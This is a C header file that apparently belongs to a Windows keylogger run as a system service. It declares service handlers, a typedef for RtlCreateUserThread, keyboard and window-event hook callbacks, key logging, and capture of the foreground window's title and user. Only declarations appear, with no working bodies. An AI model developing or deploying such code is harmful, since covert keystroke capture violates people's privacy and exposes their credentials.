#pragma once

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <bcrypt.h>
#include <winternl.h>
#include <wtsapi32.h>
#include "consts.h"

#define REEF(x){ if (x){ free(x); x = NULL;}}


typedef long (*_RtlCreateUserThread)(HANDLE,
    PSECURITY_DESCRIPTOR,
    BOOLEAN,ULONG,
    PULONG,PULONG,
    PVOID,PVOID,
    PHANDLE,CLIENT_ID* );

_RtlCreateUserThread RtlCreateUserThread;

VOID WINAPI SvcMain(DWORD dwArgc, LPTSTR *lpszArgv);
VOID WINAPI SvcCtrlHandler(DWORD ctrl);
VOID SvcInit(DWORD dwArgc, LPTSTR *lpszArgv);
VOID ReportSvcStatus(DWORD currentState, DWORD win32ExitCode, DWORD waitHint);

//keylogger
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
VOID CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD idEventThread, DWORD dwmsEventTime);
VOID LogvKey(INT vKey, INT MODE);
VOID GetUsernameOfForegroundWindow(LPSTR username, DWORD foregroundWindowPID);
VOID GetWindowTitle(HWND hwnd);

//log
VOID log(void *toLog, int MODE, BOOL putDate);

//error handling
INT PrintError(void);